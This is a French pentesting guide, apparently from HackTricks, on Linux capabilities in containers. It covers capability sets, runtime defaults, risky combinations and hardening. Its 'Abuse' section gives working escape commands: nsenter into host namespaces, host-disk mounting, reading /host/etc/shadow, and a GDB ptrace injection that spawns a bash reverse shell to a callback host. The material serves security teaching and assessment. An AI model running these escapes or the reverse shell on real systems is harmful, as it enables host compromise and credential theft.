# Linux Capabilities Dans Les Conteneurs

{{#include ../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Les Linux capabilities sont l'un des éléments les plus importants de la sécurité des conteneurs, car elles répondent à une question subtile, mais fondamentale : **que signifie réellement « root » à l'intérieur d'un conteneur ?** Sur un système Linux normal, l'UID 0 impliquait historiquement un ensemble de privilèges très étendu. Dans les kernels modernes, ces privilèges sont décomposés en unités plus petites appelées capabilities. Un processus peut s'exécuter en tant que root tout en ne disposant pas de nombreuses opérations puissantes si les capabilities correspondantes ont été supprimées. <sup>[[1]](#references)</sup>

Les conteneurs dépendent fortement de cette distinction. De nombreux workloads sont toujours lancés avec l'UID 0 à l'intérieur du conteneur pour des raisons de compatibilité ou de simplicité. Sans suppression des capabilities, cela serait beaucoup trop dangereux. Avec cette suppression, un processus root conteneurisé peut toujours effectuer de nombreuses tâches ordinaires dans le conteneur tout en se voyant refuser des opérations plus sensibles du kernel. C'est pourquoi un shell de conteneur affichant `uid=0(root)` ne signifie pas automatiquement « root sur l'hôte », ni même « privilèges étendus sur le kernel ». Les ensembles de capabilities déterminent la valeur réelle de cette identité root.

Pour la référence complète des Linux capabilities et de nombreux exemples d'abus, voir :

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Fonctionnement

Les capabilities sont suivies dans plusieurs ensembles, notamment les ensembles permitted, effective, inheritable, ambient et bounding. Pour de nombreuses évaluations de conteneurs, la sémantique exacte de chaque ensemble au niveau du kernel est moins importante dans l'immédiat que la question pratique finale : **quelles opérations privilégiées ce processus peut-il effectuer avec succès maintenant, et quels gains de privilèges futurs sont encore possibles ?** <sup>[[1]](#references)</sup>

Cela est important, car de nombreuses techniques de breakout sont en réalité des problèmes de capabilities déguisés en problèmes de conteneurs. Un workload disposant de `CAP_SYS_ADMIN` peut accéder à une quantité considérable de fonctionnalités du kernel auxquelles un processus root normal dans un conteneur ne devrait pas accéder. Un workload disposant de `CAP_NET_ADMIN` devient beaucoup plus dangereux s'il partage également le network namespace de l'hôte. Un workload disposant de `CAP_SYS_PTRACE` devient beaucoup plus intéressant s'il peut voir les processus de l'hôte via le partage du PID namespace de l'hôte. Dans Docker ou Podman, cela peut apparaître sous la forme de `--pid=host` ; dans Kubernetes, cela apparaît généralement sous la forme de `hostPID: true`.

En d'autres termes, l'ensemble de capabilities ne peut pas être évalué isolément. Il doit être analysé conjointement avec les namespaces, seccomp et la politique MAC.

## Lab

Une manière très directe d'inspecter les capabilities à l'intérieur d'un conteneur est la suivante :
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Vous pouvez également comparer un conteneur plus restrictif avec un autre auquel toutes les capabilities ont été ajoutées :
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Pour observer l’effet d’un ajout limité, essayez de tout supprimer, puis de ne réajouter qu’une seule capacité :
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ces petites expériences montrent qu’un runtime ne se contente pas d’activer ou de désactiver un booléen appelé « privileged ». Il façonne la surface de privilèges réellement disponible pour le processus.

## Capacités à haut risque

Les capabilities deviennent des primitives d’évasion uniquement lorsque leur opération atteint une **ressource contrôlée par l’hôte**. Les combinaisons à haut risque récurrentes sont les suivantes :

- **`CAP_SYS_ADMIN`** associé à un PID hôte, à un périphérique bloc ou à un chemin de contrôle du kernel accessible en écriture. Rejoindre le mount namespace cible nécessite également **`CAP_SYS_CHROOT`** ; monter un système de fichiers basé sur des blocs nécessite **`CAP_SYS_ADMIN`** dans l’user namespace initial.
- **`CAP_SYS_PTRACE`** associé à la visibilité des PID hôtes et à un processus hôte auquel il est possible de s’attacher. **`CAP_SYS_ADMIN`** n’est pas requis pour une injection ptrace.
- **`CAP_DAC_OVERRIDE`** ou **`CAP_DAC_READ_SEARCH`** associé à un système de fichiers hôte accessible. Ces capabilities contournent des contrôles DAC différents, mais ne créent pas de vue sur le système de fichiers hôte.
- **`CAP_SYS_MODULE`** dans l’user namespace initial associé à un module accepté et compatible avec le kernel. Les conteneurs Linux ordinaires partagent le kernel du nœud ; les runtimes basés sur une VM ou un kernel en espace utilisateur modifient cette limite.
- **`CAP_MKNOD`** dans l’user namespace initial associé à un véritable périphérique hôte déjà autorisé par le device cgroup. Créer un nœud ne contourne pas le device cgroup.
- **`CAP_SYS_RAWIO`** associé à une interface mémoire, port d’E/S, PCI ou de contrôle de périphérique exposée et utilisable.
- **`CAP_SYS_BOOT`** associé à l’init PID namespace pour redémarrer l’hôte, ou à un chemin kexec utilisable et autorisé pour remplacer le kernel.
- **`CAP_NET_ADMIN`** dans le network namespace hôte pour contrôler directement l’état réseau du nœud. **`CAP_NET_RAW`** peut participer à une évasion spécifique à un protocole, mais les raw sockets seuls ne fournissent pas un shell sur le nœud.

**`CAP_SYS_CHROOT`** n’est volontairement pas listée comme capability d’évasion autonome. Elle peut être requise par `setns()` sur un mount namespace et faciliter l’utilisation d’une arborescence hôte déjà accessible, mais `chroot()` seul n’expose pas cette arborescence et n’accorde pas de nouvelles permissions sur le système de fichiers. De même, **`CAP_BPF`** et **`CAP_PERFMON`** exposent une télémétrie puissante et une surface d’attaque du kernel importante, mais en l’absence d’une vulnérabilité distincte du kernel, leurs opérations ordinaires ne constituent pas des container escapes génériques.

## Utilisation par les runtimes

Docker, Podman, les stacks basées sur containerd et CRI-O utilisent tous des contrôles de capabilities, mais leurs valeurs par défaut et leurs interfaces de gestion diffèrent. Docker les expose directement via des flags tels que `--cap-drop` et `--cap-add`. Podman propose des contrôles similaires et les combine souvent avec une exécution rootless comme couche de sécurité supplémentaire. Kubernetes expose les ajouts et suppressions de capabilities via le `securityContext` du Pod ou du conteneur ; les runtimes de niveau inférieur expriment les ensembles résultants dans la configuration du runtime OCI. Les environnements de system containers tels que LXC et Incus reposent également sur le contrôle des capabilities, mais leur intégration plus large avec l’hôte peut inciter les opérateurs à assouplir les valeurs par défaut plus fortement qu’ils ne le feraient pour un conteneur applicatif. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Le même principe s’applique à tous : une capability qu’il est techniquement possible d’accorder n’est pas nécessairement une capability qui devrait l’être. De nombreux incidents réels commencent lorsqu’un opérateur ajoute une capability simplement parce qu’une workload échouait avec une configuration plus stricte et que l’équipe avait besoin d’un correctif rapide.

## Mauvaises configurations

L’erreur la plus évidente est **`--cap-add=ALL`** dans les CLIs de type Docker/Podman, mais ce n’est pas la seule. En pratique, un problème plus fréquent consiste à accorder une ou deux capabilities extrêmement puissantes, en particulier `CAP_SYS_ADMIN`, pour « faire fonctionner l’application », sans comprendre également les implications liées aux namespaces, à seccomp et aux mounts. Un autre mode de défaillance courant consiste à combiner des capabilities supplémentaires avec le partage de namespaces hôtes. Dans Docker ou Podman, cela peut apparaître sous la forme de `--pid=host`, `--network=host` ou `--userns=host` ; dans Kubernetes, l’exposition équivalente apparaît généralement via des paramètres de workload tels que `hostPID: true` ou `hostNetwork: true`. Chacune de ces combinaisons modifie ce que la capability peut réellement affecter.

Il est également courant de voir des administrateurs penser que, parce qu’une workload n’est pas entièrement `--privileged`, elle reste significativement contrainte. C’est parfois vrai, mais il arrive aussi que la posture effective soit déjà suffisamment proche du mode privilégié pour que la distinction cesse d’avoir une importance opérationnelle.

## Abuse

Commencez par consigner les ensembles effectifs, le mapping de l’user namespace, l’état de seccomp, les namespaces, les mounts et les devices. Un nom de capability sans ce contexte ne prouve pas une évasion :
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN` : namespaces et périphériques bloc

Avec la visibilité des PID de l'hôte, `CAP_SYS_ADMIN` peut entrer dans les namespaces de l'hôte. L'opération sur le mount namespace nécessite également `CAP_SYS_CHROOT` dans le user namespace de l'appelant.

**Vérifiez la capability et le confinement :**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Énumérez la cible :** confirmez le partage des PID de l’hôte à partir de la configuration du container/Pod ou d’une liste de processus de l’hôte sans ambiguïté, puis inspectez les namespaces de la cible. Un PID 1 local existe également dans les namespaces PID privés ; sa seule présence ne prouve donc pas le partage des PID de l’hôte.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Exploiter le chemin du namespace :**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Les vérifications des capabilities doivent réussir dans les user namespaces qui possèdent les cibles. `--pid=host` ou `hostPID: true` dans Kubernetes fournit la visibilité, mais pas les capabilities.

Pour l’alternative basée sur les block devices, **énumérez** les candidats, puis **exploitez** le système de fichiers accessible en montant d’abord le candidat validé en lecture seule :
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
Le nœud de périphérique doit exister, le cgroup du périphérique doit l’autoriser, et les montages de systèmes de fichiers en mode bloc nécessitent `CAP_SYS_ADMIN` dans l’espace de noms utilisateur initial. Une racine de l’hôte déjà montée avec bind sur `/host` permet d’accéder à l’hôte **sans** `CAP_SYS_ADMIN` ; `chroot /host` n’est qu’une commodité et nécessite séparément `CAP_SYS_CHROOT`.

### Racine de l’hôte accessible : exécution directe du système de fichiers

Si la racine de l’hôte est déjà montée sur `/host`, vérifiez d’abord le montage, puis utilisez directement l’accès existant. Cette méthode ne dépend pas de `CAP_SYS_ADMIN` :
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
Si `chroot()` n’est pas disponible, mais que le binaire de l’hôte est compatible avec l’architecture et le loader du container, il peut souvent être appelé via l’arborescence montée à la place :
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
Les lectures et écritures directes sous `/host` constituent déjà une compromission du système de fichiers de l’hôte. `chroot()` ou l’exécution d’un binaire de l’hôte ne rendent cet accès que plus pratique ; aucune de ces opérations ne crée le montage de l’hôte ni ne contourne un montage en lecture seule ou une politique MAC.

### `CAP_SYS_PTRACE`: host-process injection

Avec la visibilité des PID de l’hôte et `CAP_SYS_PTRACE` dans le user namespace de la cible, GDB peut faire appeler `system()` à un processus approuvé de l’hôte. `CAP_SYS_ADMIN` n’est pas requis.

**Vérifiez la capability et les contrôles d’attachement :**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Énumérez et sélectionnez une cible disposable : confirmez le partage des PID de l’hôte à partir de la configuration ou d’une liste de processus du nœud sans ambiguïté ; ne sélectionnez jamais le PID 1 ni un daemon critique.**
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Exploiter le processus sélectionné :**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
La cible doit être attachable et disposer d’un symbole `system()` utilisable ainsi que d’un chemin vers le payload Bash. Yama, l’état non dumpable, seccomp, les user namespaces et la policy MAC peuvent bloquer la chaîne. GDB arrête la cible pendant qu’il y est attaché ; utilisez donc uniquement un processus de laboratoire jetable.

### `CAP_DAC_OVERRIDE` et `CAP_DAC_READ_SEARCH` : fichiers protégés de l’hôte

Ces capabilities n’exposent pas le filesystem de l’hôte. Si `/host` est déjà un mount de l’hôte, `CAP_DAC_READ_SEARCH` peut contourner les vérifications DAC de lecture/recherche, et `CAP_DAC_OVERRIDE` peut en plus contourner les vérifications ordinaires d’écriture :

**Vérifier les capabilities :**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Énumérer le système de fichiers exposé de l’hôte et les permissions de la cible :**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**Testez les contournements de lecture et d’écriture** dans un lab jetable :
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Un montage en lecture seule et les règles LSM restent applicables. `CAP_DAC_READ_SEARCH` autorise également `open_by_handle_at()`, mais un breakout tel que Shocker nécessite en plus un descripteur de fichier de montage pour le même système de fichiers sous-jacent, des handles valides ou découvrables, une disposition compatible du système de fichiers/du stockage, ainsi qu'aucun blocage du runtime ou de LSM. Il ne fournit pas un accès arbitraire à tous les systèmes de fichiers situés en dehors du mount namespace.

### `CAP_SYS_MODULE` : exécution dans le kernel partagé

Dans un container Linux ordinaire, un module accepté s'exécute dans le kernel partagé de l'hôte.

**Vérifiez la capability et la portée du user namespace :**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Énumérer les prérequis au chargement des modules :**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Exploiter uniquement avec un module de preuve compatible et préalablement examiné sur un nœud jetable :**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
La capability doit être effective dans l’espace de noms utilisateur initial. La version et la configuration du kernel, les signatures des modules, le lockdown, seccomp et la policy LSM doivent autoriser le chargement. Kata, gVisor, l’isolation Hyper-V et les runtimes similaires modifient la boundary du kernel que le workload atteint.

### `CAP_MKNOD` : créer un handle de périphérique autorisé

`CAP_MKNOD` crée un nœud de périphérique, mais ne contourne pas le device cgroup. La création de périphériques n’est pas namespacée ; la capability doit donc être effective dans l’espace de noms utilisateur initial.

**Vérifier la capability et la portée de l’espace de noms utilisateur :**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Énumérez les périphériques réels, leurs numéros majeur/mineur et toute allowlist cgroup-v1 visible :**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Exploiter en lecture seule un candidat ext-family validé :**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Les autres systèmes de fichiers nécessitent un outil read-only correspondant ; monter le périphérique nécessite en outre `CAP_SYS_ADMIN`. Une `Operation not permitted` lors de l’ouverture du nœud créé indique généralement que le device cgroup le bloque toujours. Sous cgroup v2, l’accès aux périphériques est généralement appliqué avec BPF et aucun fichier `devices.list` n’existe ; une ouverture réussie est donc le test décisif.

### `CAP_SYS_RAWIO` : interface raw-I/O exposée

Il n’existe pas de payload générique portable : les adresses et les effets valides dépendent du matériel et de la configuration du kernel.

**Vérifiez la capability et la portée du user namespace :**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Énumérer les interfaces brutes, le matériel et les pilotes exposés :**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Exploit uniquement avec une preuve approuvée pour le périphérique et la plage d’adresses identifiés.** Si `/dev/mem` est l’interface approuvée par le laboratoire, ce modèle prouve la divulgation de la mémoire du nœud sans en afficher le contenu :
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
L’adresse doit provenir de la carte matérielle du lab, car la lecture de certaines régions MMIO peut avoir des effets secondaires. Une commande générique d’écriture mémoire serait trompeuse et dangereuse : la même adresse peut être inoffensive sur une machine et contrôler du matériel ou la mémoire du kernel sur une autre. Les device cgroups, les permissions du filesystem, les restrictions strictes de `/dev/mem`, le kernel lockdown, la virtualisation et les règles LSM empêchent généralement tout accès utile.

### `CAP_SYS_BOOT` : reboot du namespace ou remplacement du kernel

Dans un namespace PID privé, `reboot()` termine le processus init de ce namespace au lieu de redémarrer l’hôte. Un impact sur le reboot de l’hôte nécessite donc le namespace PID initial, normalement via le partage des PID de l’hôte. Une voie kexec nécessite également une image de kernel compatible ainsi qu’une politique permissive concernant le lockdown et les signatures :

**Vérifier la capability :**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Énumérez les prérequis de PID namespace et de kexec : confirmez le partage des PID de l’hôte à partir de la configuration de la workload, car un simple lien vers un PID namespace ne révèle pas s’il s’agit du namespace initial du nœud.**
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Exploit uniquement lorsque le redémarrage d’un nœud de laboratoire jetable constitue explicitement l’exercice :**
```bash
sync
reboot -f
```
N’exécutez pas cette commande et ne chargez pas de kernel sur un nœud partagé simplement pour prouver la capability. Dans un PID namespace privé, cela termine uniquement le processus init de ce namespace et ne démontre aucun impact sur l’hôte.

### `CAP_NET_ADMIN` et `CAP_NET_RAW` : chemins réseau de l’hôte

`CAP_NET_ADMIN` affecte uniquement le network namespace actuel.

**Vérifiez les capabilities et le confinement :**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Énumérez le réseau actuel et confirmez la mise en réseau de l’hôte à partir de la configuration de la charge de travail :**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**Exercer `CAP_NET_ADMIN` de manière réversible :** avec le host networking, l’interface temporaire est une interface du nœud.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` autorise les sockets RAW et PACKET, mais ne constitue pas un shell hôte générique. Pour **énumérer** la chaîne GCE documentée, vérifiez la route vers les metadata et observez si le trafic en clair de `guest-agent` est visible :
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Si les prérequis correspondants sont réunis, **exploit** la chaîne spécifique à l’environnement telle qu’elle est documentée dans [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) : capturez l’état de la requête et de la séquence, injectez la réponse de métadonnées falsifiée contenant une clé SSH, puis validez l’accès à l’hôte. La chaîne nécessitait root, le host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, du trafic de métadonnées GCE en clair et une requête de guest-agent exploitable dans une race condition ; un transport ou un comportement d’agent moderne peut la rendre impossible.

## Vérifications

L’objectif des vérifications des capabilities n’est pas seulement d’extraire des valeurs brutes, mais de comprendre si le processus dispose de suffisamment de privilèges pour rendre dangereuses sa namespace actuelle et sa situation de montage.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Ce qui est intéressant ici :

- `capsh --print` est le moyen le plus simple d'identifier les capabilities à haut risque telles que `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ou `cap_sys_module`.
- La ligne `CapEff` dans `/proc/self/status` vous indique ce qui est effectivement actif actuellement, et pas seulement ce qui pourrait être disponible dans d'autres ensembles.
- Un dump des capabilities devient beaucoup plus important si le container partage également les namespaces PID, réseau ou utilisateur de l'hôte, ou dispose de mounts hôte accessibles en écriture.

Après avoir collecté les informations brutes sur les capabilities, l'étape suivante consiste à les interpréter. Demandez-vous si le processus est root, si les user namespaces sont actifs, si les namespaces de l'hôte sont partagés, si seccomp est appliqué et si AppArmor ou SELinux restreint encore le processus. Un ensemble de capabilities ne constitue qu'une partie du tableau, mais c'est souvent cette partie qui explique pourquoi un container breakout fonctionne alors qu'un autre échoue avec le même point de départ apparent.

## Runtime Defaults

| Runtime / platform | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Ensemble de capabilities réduit par défaut | Docker conserve une allowlist par défaut de capabilities et supprime les autres | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Ensemble de capabilities réduit par défaut | Les containers Podman sont unprivileged par défaut et utilisent un modèle de capabilities réduit | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hérite des valeurs par défaut du runtime sauf modification | Si aucune `securityContext.capabilities` n'est spécifiée, le container reçoit l'ensemble de capabilities par défaut du runtime | `securityContext.capabilities.add`, absence de `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O sous Kubernetes | Généralement les valeurs par défaut du runtime | L'ensemble effectif dépend du runtime et de la spécification du Pod | identique à la ligne Kubernetes ; la configuration OCI/CRI directe peut également ajouter explicitement des capabilities |

Pour Kubernetes, le point important est que l'API ne définit pas un ensemble universel de capabilities par défaut. Si le Pod n'ajoute ni ne supprime de capabilities, le workload hérite des valeurs par défaut du runtime pour ce node.

## References

- [1] [capabilities(7) - page du manuel Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - configuration des containers Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - privilèges du runtime et capabilities Linux](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - définir les capabilities d'un container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Documentation Podman - `--cap-add` et `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Documentation Incus - sécurité](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
